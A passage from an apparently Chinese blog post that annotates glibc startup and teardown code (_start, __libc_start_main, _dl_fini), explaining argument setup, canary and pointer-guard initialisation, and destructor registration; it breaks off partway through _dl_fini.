class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">ENTRY (_start) //告诉编译器，这是程序入口</span><br><span class="line">/* Clearing frame pointer is insufficient, use CFI.  */</span><br><span class="line">cfi_undefined (rip)</span><br><span class="line">/* Clear the frame pointer.  The ABI suggests this be done, to mark</span><br><span class="line">   the outermost frame obviously.  */</span><br><span class="line">xorl %ebp, %ebp //初始化栈底</span><br><span class="line"></span><br><span class="line">/* Extract the arguments as encoded on the stack and set up</span><br><span class="line">   the arguments for __libc_start_main (int (*main) (int, char **, char **),</span><br><span class="line">   int argc, char *argv,</span><br><span class="line">   void (*init) (void), void (*fini) (void),</span><br><span class="line">   void (*rtld_fini) (void), void *stack_end).</span><br><span class="line">   The arguments are passed via registers and on the stack:</span><br><span class="line">main:%rdi</span><br><span class="line">argc:%rsi</span><br><span class="line">argv:%rdx</span><br><span class="line">init:%rcx</span><br><span class="line">fini:%r8</span><br><span class="line">rtld_fini:%r9</span><br><span class="line">stack_end:stack.*/ /*这里写的是__libc_start_main函数的传参寄存器*/</span><br><span class="line"></span><br><span class="line">mov %RDX_LP, %R9_LP/* Address of the shared library termination function.  *//*设置参数rtld_fini*/</span><br><span class="line">#ifdef __ILP32__</span><br><span class="line">mov (%rsp), %esi/* Simulate popping 4-byte argument count.  */</span><br><span class="line">add $4, %esp</span><br><span class="line">#else</span><br><span class="line">popq %rsi/* Pop the argument count.  */ //设置参数argc</span><br><span class="line">#endif</span><br><span class="line">/* argv starts just at the current stack top.  */</span><br><span class="line">mov %RSP_LP, %RDX_LP  //设置参数argv</span><br><span class="line">/* Align the stack to a 16 byte boundary to follow the ABI.  */</span><br><span class="line">and  $~15, %RSP_LP   //rsp对齐</span><br><span class="line"></span><br><span class="line">/* Push garbage because we push 8 more bytes.  */</span><br><span class="line">pushq %rax</span><br><span class="line"></span><br><span class="line">/* Provide the highest stack address to the user code (for stacks</span><br><span class="line">   which grow downwards).  */</span><br><span class="line">pushq %rsp</span><br><span class="line"></span><br><span class="line">#ifdef PIC</span><br><span class="line">/* Pass address of our own entry points to .fini and .init.  */</span><br><span class="line">//设置参数init和fini</span><br><span class="line">mov __libc_csu_fini@GOTPCREL(%rip), %R8_LP</span><br><span class="line">mov __libc_csu_init@GOTPCREL(%rip), %RCX_LP</span><br><span class="line"></span><br><span class="line">mov main@GOTPCREL(%rip), %RDI_LP        //设置参数main函数地址</span><br><span class="line">#else</span><br><span class="line">/* Pass address of our own entry points to .fini and .init.  */</span><br><span class="line">mov $__libc_csu_fini, %R8_LP</span><br><span class="line">mov $__libc_csu_init, %RCX_LP</span><br><span class="line"></span><br><span class="line">mov $main, %RDI_LP</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">/* Call the user&#x27;s main function, and exit with its value.</span><br><span class="line">   But let the libc call main.  Since __libc_start_main in</span><br><span class="line">   libc.so is called very early, lazy binding isn&#x27;t relevant</span><br><span class="line">   here.  Use indirect branch via GOT to avoid extra branch</span><br><span class="line">   to PLT slot.  In case of static executable, ld in binutils</span><br><span class="line">   2.26 or above can convert indirect branch into direct</span><br><span class="line">   branch.  */</span><br><span class="line">   //调用</span><br><span class="line">call *__libc_start_main@GOTPCREL(%rip)</span><br><span class="line"></span><br><span class="line">hlt/* Crash if somehow `exit&#x27; does return. */</span><br><span class="line">END (_start)</span><br></pre></td></tr></table></figure><p>本人不是很习惯看att风格的汇编，我们对照ida里的汇编来看。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401140</span>                 public _start</span><br><span class="line">.text:<span class="number">0000000000401140</span> _start          <span class="keyword">proc</span> near               ; <span class="type">DATA</span> <span class="type">XREF</span>: <span class="type">LOAD</span>:00000000003FE018↑o</span><br><span class="line">.text:<span class="number">0000000000401140</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401140</span>                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401144</span>                 xor     ebp, ebp</span><br><span class="line">.text:<span class="number">0000000000401146</span>                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:<span class="number">0000000000401149</span>                 pop     rsi             ; argc</span><br><span class="line">.text:000000000040114A                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:000000000040114D                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:<span class="number">0000000000401151</span>                 push    rax</span><br><span class="line">.text:<span class="number">0000000000401152</span>                 push    rsp             ; stack_end</span><br><span class="line">.text:<span class="number">0000000000401153</span>                 mov     r8, offset __libc_csu_fini ; fini</span><br><span class="line">.text:000000000040115A                 mov     rcx, offset __libc_csu_init ; init</span><br><span class="line">.text:<span class="number">0000000000401161</span>                 mov     rdi, offset main ; main</span><br><span class="line">.text:<span class="number">0000000000401168</span>                 call    cs:__libc_start_main_ptr</span><br><span class="line">.text:000000000040116E                 hlt</span><br><span class="line">.text:000000000040116E ; &#125; // starts at <span class="number">401140</span></span><br><span class="line">.text:000000000040116E _start          endp</span><br></pre></td></tr></table></figure><p>会发现，start函数就调用了一个__libc_start_main函数，这个函数一旦返回，就直接hlt停机了。那么就能先大致推测，main函数是由__libc_start_main函数引导启动的，其他程序的准备包括析构函数的注册也是在此进行。</p><h5 id="libc-start-main"><a href="#libc-start-main" class="headerlink" title="libc_start_main()"></a>libc_start_main()</h5><p>我们追踪这个函数，在libc-start.c中有定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">STATIC <span class="type">int</span></span><br><span class="line"><span class="title function_">LIBC_START_MAIN</span> <span class="params">(<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span></span><br><span class="line"><span class="params"> <span class="type">int</span> argc, <span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">#ifdef LIBC_START_MAIN_AUXVEC_ARG</span></span><br><span class="line"><span class="params"> ElfW(<span class="type">auxv_t</span>) *auxvec,</span></span><br><span class="line"><span class="params">#endif</span></span><br><span class="line"><span class="params"> __typeof (main) init,</span></span><br><span class="line"><span class="params"> <span class="type">void</span> (*fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params"> <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Result of the &#x27;main&#x27; function.  */</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">//保存main函数的返回地址</span></span><br><span class="line"></span><br><span class="line">  __libc_multiple_libcs = &amp;_dl_starting_up &amp;&amp; !_dl_starting_up;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  _dl_relocate_static_pie (); <span class="comment">//设置程序基址，重新定位</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> **ev = &amp;argv[argc + <span class="number">1</span>]; <span class="comment">//保存环境变量</span></span><br><span class="line"></span><br><span class="line">  __environ = ev; <span class="comment">//这个就是ssp攻击中常见的获取栈地址的环境变量</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Store the lowest stack address.  This is done in ld.so if this is</span></span><br><span class="line"><span class="comment">     the code for the DSO.  */</span></span><br><span class="line">  __libc_stack_end = stack_end; <span class="comment">//保存栈底地址</span></span><br><span class="line"></span><br><span class="line"> ...<span class="comment">//省略了一些看不懂且应该没啥用的代码</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize very early so that tunables can use it.  */</span></span><br><span class="line">  __libc_init_secure ();</span><br><span class="line"></span><br><span class="line">  __tunables_init (__environ);</span><br><span class="line"></span><br><span class="line">  ARCH_INIT_CPU_FEATURES ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Perform IREL&#123;,A&#125; relocations.  */</span></span><br><span class="line">  ARCH_SETUP_IREL ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The stack guard goes into the TCB, so initialize it early.  */</span></span><br><span class="line">  ARCH_SETUP_TLS ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In some architectures, IREL&#123;,A&#125; relocations happen after TLS setup in</span></span><br><span class="line"><span class="comment">     order to let IFUNC resolvers benefit from TCB information, e.g. powerpc&#x27;s</span></span><br><span class="line"><span class="comment">     hwcap and platform fields available in the TCB.  */</span></span><br><span class="line">  ARCH_APPLY_IREL ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set up the stack checker&#x27;s canary.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random); <span class="comment">//生成canary，然后保存</span></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> THREAD_SET_STACK_GUARD</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  __stack_chk_guard = stack_chk_guard;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> DL_SYSDEP_OSCHECK</span></span><br><span class="line">  <span class="keyword">if</span> (!__libc_multiple_libcs)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This needs to run to initiliaze _dl_osversion before TLS</span></span><br><span class="line"><span class="comment"> setup might check it.  */</span></span><br><span class="line">      DL_SYSDEP_OSCHECK (__libc_fatal);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize libpthread if linked in.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__pthread_initialize_minimal != <span class="literal">NULL</span>)</span><br><span class="line">    __pthread_initialize_minimal (); <span class="comment">//初始化TLS</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set up the pointer guard value.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> pointer_chk_guard = _dl_setup_pointer_guard (_dl_random,</span><br><span class="line"> stack_chk_guard); <span class="comment">//生成pointer_guard，并保存</span></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> THREAD_SET_POINTER_GUARD</span></span><br><span class="line">  THREAD_SET_POINTER_GUARD (pointer_chk_guard);</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  __pointer_chk_guard_local = pointer_chk_guard;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* !SHARED  */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Register the destructor of the dynamic linker if there is any.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (rtld_fini != <span class="literal">NULL</span>))</span><br><span class="line">    __cxa_atexit ((<span class="type">void</span> (*) (<span class="type">void</span> *)) rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">//注册ld的析构函数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Call the initializer of the libc.  This is only needed here if we</span></span><br><span class="line"><span class="comment">     are compiling for the static library in which case we haven&#x27;t</span></span><br><span class="line"><span class="comment">     run the constructors in `_dl_start_user&#x27;.  */</span></span><br><span class="line">  __libc_init_first (argc, argv, __environ); <span class="comment">//初始化libc</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Register the destructor of the program, if any.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fini)</span><br><span class="line">    __cxa_atexit ((<span class="type">void</span> (*) (<span class="type">void</span> *)) fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">//注册fini函数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Some security at this point.  Prevent starting a SUID binary where</span></span><br><span class="line"><span class="comment">     the standard file descriptors are not opened.  We have to do this</span></span><br><span class="line"><span class="comment">     only for statically linked applications since otherwise the dynamic</span></span><br><span class="line"><span class="comment">     loader did the work already.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (__libc_enable_secure, <span class="number">0</span>))</span><br><span class="line">    __libc_check_standard_fds ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Call the initializer of the program, if any.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">    GLRO(dl_debug_printf) (<span class="string">&quot;\ninitialize program: %s\n\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (init)</span><br><span class="line">    (*init) (argc, argv, __environ MAIN_AUXVEC_PARAM); <span class="comment">//调用构造函数init</span></span><br><span class="line"></span><br><span class="line">... <span class="comment">//省略了一些代码，大概是对线程的初始化和一些维护工作</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/* Nothing fancy, just call the function.  */</span></span><br><span class="line">  result = main (argc, argv, __environ MAIN_AUXVEC_PARAM); <span class="comment">//调用main函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span> (result); <span class="comment">//如果main函数返回了，会先返回到这里，这个函数帮main调用exit函数来终止线程。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们清楚了一件事：libc_start_main函数确实注册了几个析构函数，还调用了个构造函数。根据注释我们可以知道，rtld_fini函数是ld的析构函数，fini是elf的析构函数。</p><p>奇怪的是，elf当中的fini函数是一个空函数，直接retn了，什么都没有。而调用的那个init则负责遍历.init_array段，实现段上多个构造函数的调用。而和.init_array挨得很近的.fini_array段，则由ld的rtld_fini负责，显然elf中的fini函数本身没什么用处。</p><h5 id="dl-fini"><a href="#dl-fini" class="headerlink" title="_dl_fini()"></a>_dl_fini()</h5><p>rtld_fini实际指向_dl_fini函数，我们跟踪一下这个函数，在elf&#x2F;dl-fini.c中有定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Lots of fun ahead.  We have to call the destructors for all still</span></span><br><span class="line"><span class="comment">     loaded objects, in all namespaces.  The problem is that the ELF</span></span><br><span class="line"><span class="comment">     specification now demands that dependencies between the modules</span></span><br><span class="line"><span class="comment">     are taken into account.  I.e., the destructor for a module is</span></span><br><span class="line"><span class="comment">     called before the ones for any of its dependencies.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To make things more complicated, we cannot simply use the reverse</span></span><br><span class="line"><span class="comment">     order of the constructors.  Since the user might have loaded objects</span></span><br><span class="line"><span class="comment">     using `dlopen&#x27; there are possibly several other modules with its</span></span><br><span class="line"><span class="comment">     dependencies to be taken into account.  Therefore we have to start</span></span><br><span class="line"><span class="comment">     determining the order of the modules once again from the beginning.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We run the destructors of the main namespaces last.  As for the</span></span><br><span class="line"><span class="comment">     other namespaces, we pick run the destructors in them in reverse</span></span><br><span class="line"><span class="comment">     order of the namespace ID.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line"> again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) <span class="comment">//遍历_rtld_global中的所有非共享模块: _dl_ns[DL_NNS]</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock)); <span class="comment">//对rtld_global上锁</span></span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment"> auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  )</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock)); <span class="comment">//如果这个命名空间中没有模块，则直接解锁</span></span><br><span class="line">      <span class="keyword">else</span> <span class="comment">//否则遍历模块</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">     copy the pointers in.  */</span></span><br><span class="line">  <span class="keyword">struct</span> link_map *maps[nloaded]; <span class="comment">//把这个命名空间中的所有模块指针, 都复制到maps数组中</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">  assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">      &#123;</span><br><span class="line">assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">maps[i] = l;</span><br><span class="line">l-&gt;l_idx = i;</span><br><span class="line">++i;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">++l-&gt;l_direct_opencount;</span><br><span class="line">      &#125;</span><br><span class="line">  assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> nmaps = i; <span class="comment">//模块数量</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Now we have to do the sorting.  We can skip looking for the</span></span><br><span class="line"><span class="comment">     binary itself which is at the front of the search list for</span></span><br><span class="line"><span class="comment">     the main namespace.  */</span></span><br><span class="line">  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line"> <span class="literal">NULL</span>, <span class="literal">true</span>); <span class="comment">//排序确定析构顺序</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">     from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">     various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">     count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">     we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">     from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">     lock.  */</span></span><br><span class="line">  __rtld_lock_unlock_recursive (GL(dl_load_lock)); <span class="comment">//解锁</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">     call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">     the front.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i) <span class="comment">//按顺序析构每一个模块</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">           <span class="comment">/* 是否包含fini_array节, 或者fini节 */</span></span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">      || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">  DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">  ns);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">         <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     l-&gt;l_addr: 模块l的加载基地址</span></span><br><span class="line"><span class="comment">                     l-&gt;l_info[DT_FINI_ARRAY]: 模块l中fini_array节的描述符</span></span><br><span class="line"><span class="comment">                     l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr: 模块l中fini_arrary节的偏移</span></span><br><span class="line"><span class="comment">                     array: 为模块l的fini_array节的内存地址</span></span><br><span class="line"><span class="comment">                   */</span>                 </span><br><span class="line">  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">    + 